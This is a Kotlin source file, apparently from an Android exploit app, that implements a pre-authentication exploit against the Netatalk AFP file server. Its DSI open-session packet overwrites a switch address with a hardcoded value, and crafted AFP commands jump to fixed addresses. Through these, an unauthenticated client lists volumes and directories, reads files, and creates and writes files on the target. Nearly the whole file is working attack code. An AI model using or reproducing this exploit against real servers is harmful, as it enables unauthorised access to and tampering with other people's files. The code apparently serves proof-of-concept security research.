package me.smoothhacker.swampsploit.exploit

import android.util.Log
import me.smoothhacker.swampsploit.utils.ExploitContext
import java.io.InputStream
import java.net.*
import java.util.*
import kotlin.collections.ArrayList

@OptIn(ExperimentalUnsignedTypes::class)
class Netatalk constructor(
    private val ctx: ExploitContext,
    private val fileName: String = "PoC Demo",
) {
    private val tag = "Netatalk"
    val preauthSwitchAddress = ubyteArrayOf(0x40u, 0x31u, 0x65u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u) // 653140

    fun formatMalAFP(payload: UByteArray, address: UByteArray): UByteArray {
        val result = UByteArray(144)
        result[0] = 0x11u
        payload.copyInto(result, 2)
        address.copyInto(result, 136)
        return result
    }

    fun formatMalAFP(address: UByteArray): UByteArray {
        return formatMalAFP(ubyteArrayOf(), address)
    }

    @ExperimentalUnsignedTypes
    class DSI constructor(var flag: UByte, var command: UByte, var requestId: UShort, var payload: UByteArray = ubyteArrayOf()) {
        constructor(flag: Flag, command: Command, requestId: UShort, payload: UByteArray = ubyteArrayOf()) : this(flag.value, command.value, requestId, payload)

        companion object {
            fun build(stream: InputStream): DSI {
                val flag = stream.read().toUByte()
                val command = stream.read().toUByte()
                val requestId = stream.read().toUByte().toUShort().rotateLeft(8).or(stream.read().toUByte().toUShort())
                var errorCode: UInt = 0u
                for (i in 0 until 4) {
                    errorCode = errorCode.rotateLeft(8)
                    errorCode = errorCode.or(stream.read().toUByte().toUInt())
                }
                var dataSize: UInt = 0u
                for (i in 0 until 4) {
                    dataSize = dataSize.rotateLeft(8)
                    dataSize = dataSize.or(stream.read().toUByte().toUInt())
                }
                var reserved: UInt = 0u
                for (i in 0 until 4) {
                    reserved = reserved.rotateLeft(8)
                    reserved = reserved.or(stream.read().toUByte().toUInt())
                }
                val payload = UByteArray(dataSize.toInt())
                for (i in payload.indices) {
                    payload[i] = stream.read().toUByte()
                }
                return DSI(flag, command, requestId, payload)
            }
        }

        enum class Flag constructor(val value: UByte) {
            Request(0u),
            Reply(1u)
        }

        enum class Command constructor(val value: UByte) {
            DSICloseSession(1u),
            DSICommand(2u),
            DSIGetStatus(3u),
            DSIOpenSession(4u),
            DSITickle(5u),
            DSIWrite(6u),
            DSIAttention(8u)
        }

        val packet: UByteArray
            get() {
                val result = UByteArray(16 + payload.size)

                result[0] = flag
                result[1] = command
                result[2] = requestId.rotateRight(8).toUByte()
                result[3] = requestId.toUByte()

                val size = payload.size.toUInt()
                for (i in 0 until 4) {
                    result[11 - i] = size.rotateLeft(i * 8).toUByte()
                }

                payload.copyInto(result, 16)
                return result
            }

        override fun toString(): String {
            return String(packet.toByteArray(), Charsets.UTF_8)
        }

    }

    fun connect(): Socket {
        val client = Socket()
        client.soTimeout = ctx.getTimeout().toInt()

        try {
            client.connect(InetSocketAddress(ctx.getHost(), ctx.getPort().toInt()), ctx.getTimeout().toInt())

            ctx.log("Connected to ${ctx.getHost()}:${ctx.getPort()}.")
        } catch (e: Exception) {
            throw Exception("Failed to establish connection.")
        }

        return client
    }

    fun initialize(client: Socket, requestId: UShort = 1u): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            // initial exploit
            val exploit = UByteArray(18 + preauthSwitchAddress.size)
            ubyteArrayOf(
                0x1u, (exploit.size - 2).toUByte(),
                0x0u, 0x0u, 0x40u, 0x0u,
                0x0u, 0x0u, 0x0u, 0x0u,
                0xefu, 0xbeu, 0xadu, 0xdeu, // deadbeef
                0xceu, 0xfau, 0xedu, 0xfeu, // feedface
            ).copyInto(exploit)
            preauthSwitchAddress.copyInto(exploit, 18)

            val dsi = DSI(DSI.Flag.Request, DSI.Command.DSIOpenSession, requestId, exploit)
            output.write(dsi.packet.toByteArray())

            ctx.log("Successfully initialized exploit.")
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Exploit initialization failed.")
        }
    }

    fun listVolumes(client: Socket, requestId: UShort): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()
            val listVolumes = formatMalAFP(ubyteArrayOf(0xf3u, 0xdfu, 0x43u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 43dff3

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, listVolumes).packet.toByteArray())

            // response can be used for writing to volume
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
    }

    fun listVolumes(dsi: DSI): List<String> {
        val result = ArrayList<String>()
        try {
            val count = dsi.payload[4]
            // converting to UInt then Int ensures that 'count' will not be interpreted as negative
            var data = dsi.payload.copyOfRange(5, dsi.payload.size)
            for (i in 0 until count.toUInt().toInt()) {
                val len = data[0].toUShort().rotateLeft(8).or(data[1].toUShort()).toUInt().toInt()
                val name = data.copyOfRange(2, 2 + len)
                result.add(name.toByteArray().toString(Charsets.UTF_8))
                data = data.copyOfRange(2 + len, data.size)
            }
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
        return result
    }

    fun listVolumeContent(client: Socket, requestId: UShort, volumeId: UShort): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()
            
            val payload = ubyteArrayOf(
                volumeId.rotateRight(8).toUByte(), volumeId.toUByte(), 0x00u, 0x00u,
                0x00u, 0x02u, 0x01u, 0x40u,
                0x01u, 0x40u, 0x07u, 0xffu,
                0x00u, 0x00u, 0x00u, 0x01u,
                0x7fu, 0xffu, 0xffu, 0xffu,
                0x02u, 0x00u, 0x00u, 0x00u
            )
            
            val listVolumes = formatMalAFP(payload, ubyteArrayOf(0x4fu, 0x11u, 0x42u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 42114f

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, listVolumes).packet.toByteArray())

            // response can be used for listing volumes
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to list volume content.")
        }
    }

    fun listVolumeContent(dsi: DSI): List<String> {
        val result = ArrayList<String>()
        try {
            val count = dsi.payload[4].toUShort().rotateLeft(8).or(dsi.payload[5].toUShort())
            // converting to UInt then Int ensures that 'count' will not be interpreted as negative
            var data = dsi.payload.copyOfRange(6, dsi.payload.size)
            for (i in 0 until count.toUInt().toInt()) {
                val len = data[8].toUShort().rotateLeft(8).or(data[1].toUShort()).toUInt().toInt()
                val directory = data[2] > 0u
                var end = len;
                // names are padded with null bytes for alignment
                while (data[end - 1] == (0x0u).toUByte()) end--
                var name = data.copyOfRange(11, end).toByteArray().toString(Charsets.UTF_8)
                if (directory) name += "/"
                result.add(name)
                data = data.copyOfRange(len, data.size)
            }
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
        return result
    }

    fun openFork(client: Socket, requestId: UShort, volumeId: UShort, fileName: String): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            val payload = UByteArray(12 + fileName.length)
            ubyteArrayOf(
                volumeId.rotateRight(8).toUByte(), volumeId.toUByte(), 0x00u, 0x00u,
                0x00u, 0x02u, 0x00u, 0x00u,
                0x00u, 0x03u, 0x02u, fileName.length.toUByte()
            ).copyInto(payload)
            fileName.toByteArray().toUByteArray().copyInto(payload, 12)

            val openFork = formatMalAFP(payload, ubyteArrayOf(0x17u, 0xd4u, 0x42u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 42d417

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, openFork).packet.toByteArray())

            // response can be used for listing volumes
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to list volumes.")
        }
    }

    fun writeFile(client: Socket, requestId: UShort, forkId: UShort, data: ByteArray): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            val payload = UByteArray(14 + data.size)
            ubyteArrayOf(forkId.rotateRight(8).toUByte(), forkId.toUByte()).copyInto(payload)

            ubyteArrayOf(
                data.size.toUInt().rotateRight(24).toUByte(),
                data.size.toUInt().rotateRight(16).toUByte(),
                data.size.toUInt().rotateRight(8).toUByte(),
                data.size.toUInt().toUByte()
            ).copyInto(payload, 10)
            data.toUByteArray().copyInto(payload, 14)

            val writeFile = formatMalAFP(payload, ubyteArrayOf(0x3fu, 0x02u, 0x43u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 43023f

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, writeFile).packet.toByteArray())

            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to write data to file.")
        }
    }

    fun openVolume(client: Socket, requestId: UShort, name: String): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            name.toByteArray().toUByteArray()
            // open volume
            val payload = UByteArray(3 + name.length)
            ubyteArrayOf(0x0u, 0x20u, name.length.toUByte()).copyInto(payload)
            name.toByteArray().toUByteArray().copyInto(payload, 3)
            val openVolume = formatMalAFP(payload, ubyteArrayOf(0xa6u, 0xe8u, 0x43u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 43e8a6

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, openVolume).packet.toByteArray())

            // response is used for writing to volume
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to open volume \"$name\".")
        }
    }

    fun readFile(client: Socket, requestId: UShort, forkId: UShort): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            val payload = ubyteArrayOf(
                forkId.rotateRight(8).toUByte(), forkId.toUByte(),
                0x00u, 0x00u, 0x00u, 0x00u,
                0x00u, 0x00u, 0x00u, 0x00u,
                0x00u, 0x00u, 0x00u, 0x00u,
                0x00u, 0x00u, 0x03u, 0x00u,
            )

            val readFile = formatMalAFP(payload, ubyteArrayOf(0xd5u, 0xf0u, 0x42u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u)) // 42f0d5

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, readFile).packet.toByteArray())

            // response is used for reading file content
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to read file \"$fileName\".")
        }
    }

    fun readFile(dsi: DSI): String {
        return dsi.payload.toByteArray().toString(Charsets.UTF_8)
    }

    fun createFile(client: Socket, requestId: UShort, forkId: UShort, fileName: String): DSI {
        try {
            val input = client.getInputStream()
            val output = client.getOutputStream()

            val payload = UByteArray(8 + fileName.length)
            ubyteArrayOf(
                forkId.rotateRight(8).toUByte(), forkId.toUByte(), 0x0u, 0x0u,
                0x0u, 0x2u, 0x2u, fileName.length.toUByte()
            ).copyInto(payload)
            fileName.toByteArray().toUByteArray().copyInto(payload, 8)
            println(payload.toByteArray().contentToString())
            val createFile = formatMalAFP(payload, ubyteArrayOf(0xfcu, 0x5eu, 0x42u, 0x0u, 0x0u, 0x0u, 0x0u, 0x0u))

            output.write(DSI(DSI.Flag.Request, DSI.Command.DSICommand, requestId, createFile).packet.toByteArray())

            ctx.log("Created file \"$fileName\".")
            return DSI.build(input)
        } catch (e: Exception) {
            throw Exception("Failed to create file \"$fileName\".")
        }
    }

    fun createFile(name: String, fileName: String): Boolean {
        var response: DSI

        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, name)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            createFile(client, requestId, volumeId, fileName)
        } catch (exception: Exception) {
            exception.message?.let {
                ctx.log(it)
                Log.w(tag, it)
            }
            return false
        }

        return true
    }

    // TODO: Fix this function
    fun writeFile(volumeName: String, fileName: String, data: ByteArray): Boolean {
        var response: DSI

        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, volumeName)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            println(volumeId.toUInt().toInt())

            response = openFork(client, requestId++, volumeId, fileName)

            val forkId: UShort = response.payload[3].toUShort().rotateLeft(8).or(response.payload[2].toUShort())

            println(forkId.toUInt().toInt())

            writeFile(client, requestId, forkId, data)
        } catch (exception: Exception) {
            exception.message?.let {
                Log.w(tag, exception.toString())
                Log.w(tag, it)
            }
            return false
        }

        return true
    }

    fun listVolumes(): Boolean {
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)
            val names = listVolumes(listVolumes(client, requestId))
            for (name in names) {
                // TODO: Make volume names available to user
                Log.w(tag, "Volume Name: $name")
            }
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
            return false
        }

        return true
    }

    fun listVolumes(result: ArrayList<String>): ArrayList<String> {
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)
            val names = listVolumes(listVolumes(client, requestId))
            for (name in names) {
                result.add(name)
            }
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
        }

        return result
    }

    fun listVolumeContent(volumeName: String): Boolean {
        var response: DSI
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, volumeName)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            val names = listVolumeContent(listVolumeContent(client, requestId, volumeId))
            for (name in names) {
                // TODO: Make volume names available to user
                Log.w(tag, "Volume Name: $name")
            }
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
            return false
        }

        return true
    }

    fun listVolumeContent(volumeName: String, result: ArrayList<String>): List<String>  {
        var response: DSI
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, volumeName)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            val names = listVolumeContent(listVolumeContent(client, requestId, volumeId))
            for (name in names) {
                result.add(name)
            }
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
        }

        return result
    }

    fun readFile(volumeName: String, fileName: String): Boolean {
        var response: DSI
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, volumeName)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            response = openFork(client, requestId++, volumeId, fileName)

            val forkId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            response = readFile(client, requestId, forkId)

            val contents = readFile(response)
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
            return false
        }

        return true
    }

    fun readFile(volumeName: String, fileName: String, result: ArrayList<String>): List<String> {
        var response: DSI
        try {
            val client = connect()
            var requestId: UShort = 1u
            initialize(client, requestId++)

            response = openVolume(client, requestId++, volumeName)

            val volumeId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            response = openFork(client, requestId++, volumeId, fileName)

            val forkId: UShort = response.payload[2].toUShort().rotateLeft(8).or(response.payload[3].toUShort())

            response = readFile(client, requestId, forkId)

            result.add(readFile(response))
        } catch (exception: Exception) {
            exception.message?.let { Log.w(tag, it) }
        }

        return result
    }

     fun exploit(): Boolean {
         //return readFile("My AFP Volume", fileName)
         //return listVolumeContent("My AFP Volume")
         createFile("My AFP Volume", fileName)
         return writeFile("My AFP Volume", fileName, "Testing123".toByteArray())
     }
}
